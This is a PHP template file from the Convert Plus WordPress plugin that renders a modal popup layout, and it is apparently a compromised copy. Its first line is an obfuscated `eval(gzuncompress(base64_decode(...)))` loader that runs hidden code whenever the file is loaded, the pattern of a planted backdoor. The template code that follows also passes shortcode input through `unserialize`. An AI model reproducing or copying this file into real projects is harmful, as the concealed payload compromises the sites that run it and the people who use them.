<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Prohibit direct script loading.
 *
 * @package Convert_Plus.
 */

if ( ! function_exists( 'modal_theme_first_order_2' ) ) {
	/**
	 * Function Name: modal_theme_youtube.
	 *
	 * @param  array  $atts    array parameters.
	 * @param  string $content string parameter.
	 * @return mixed          string parameter.
	 */
	function modal_theme_first_order_2( $atts, $content = null ) {
		/**
		 * Define Variables.
		 */
		global $cp_form_vars;

		$style_id         = '';
		$settings_encoded = '';
		shortcode_atts(
			array(
				'style_id'         => '',
				'settings_encoded' => '',
			), $atts
		);
		$style_id         = $atts['style_id'];
		$settings_encoded = $atts['settings_encoded'];

		$settings       = base64_decode( $settings_encoded );
		$style_settings = unserialize( $settings );

		foreach ( $style_settings as $key => $setting ) {
			$style_settings[ $key ] = apply_filters( 'smile_render_setting', $setting );
			;
		}

		unset( $style_settings['style_id'] );

		// Generate UID.
		$uid       = uniqid();
		$uid_class = 'content-' . $uid;

		$individual_vars = array(
			'uid'         => $uid,
			'uid_class'   => $uid_class,
			'style_class' => 'cp-first-order-2',
		);

		/**
		 * Merge short code variables arrays.
		 *
		 * @array   $individual_vars        Individual style EXTRA short-code variables.
		 * @array   $cp_form_vars           CP Form global short-code variables.
		 * @array   $style_settings         Individual style short-code variables.
		 * @array   $atts                   short-code attributes.
		 */
		$all = array_merge(
			$individual_vars,
			$cp_form_vars,
			$style_settings,
			$atts
		);

		/**
		 *  Extract short-code variables.
		 *
		 *  @array      $all         All merged arrays.
		 *  @array      array()      Its required as per WP. Merged $style_settings in $all.
		 */

		$a = shortcode_atts( $all, $style_settings );

		// Before filter.
		apply_filters_ref_array( 'cp_modal_global_before', array( $a ) );

		?>
		<div class="cp-row">
			<div class="col-lg-12 col-md-12 col-sm-12 col-xs-12 cp-text-container" >
				<div class="cp-desc-container 
				<?php
				if ( '' === trim( $a['modal_short_desc1'] ) ) {
					echo 'cp-empty'; }
					?>
					">
					<div class="cp-description cp_responsive" ><?php echo do_shortcode( html_entity_decode( stripcslashes( $a['modal_short_desc1'] ) ) ); ?></div>
				</div>
				<div class="cp-title-container 
				<?php
				if ( '' === trim( $a['modal_title1'] ) ) {
					echo 'cp-empty'; }
					?>
					">
					<h2 class="cp-title cp_responsive" ><?php echo do_shortcode( html_entity_decode( stripcslashes( $a['modal_title1'] ) ) ); ?></h2>
				</div>
				<?php
				$modal_short_desc = isset( $a['modal_content'] ) ? $a['modal_content'] : '';

				if ( '' !== $modal_short_desc ) {
					?>
					<div class="cp-short-desc-container cp-clear  
					<?php
					if ( '' === trim( $modal_short_desc ) ) {
						echo 'cp-empty'; }
						?>
						">
						<div class="cp-short-description cp_responsive cp-clear " ><?php echo do_shortcode( html_entity_decode( stripcslashes( $modal_short_desc ) ) ); ?></div>
					</div>
					<?php } ?>

					<div class="cp-form-container">
						<?php
						// Embed CP Form.
						apply_filters_ref_array( 'cp_get_form', array( $a ) );
						?>
					</div>
					<div class="cp-info-container cp_responsive 
					<?php
					if ( '' === trim( $a['modal_confidential'] ) ) {
						echo 'cp-empty'; }
						?>
						" >
						<?php echo do_shortcode( html_entity_decode( stripcslashes( $a['modal_confidential'] ) ) ); ?>
					</div>
				</div>
			</div>
			<!-- AFTER CONTENTS -->
			<?php
			// After filter.
			apply_filters_ref_array( 'cp_modal_global_after', array( $a ) );

			return ob_get_clean();
	}
}
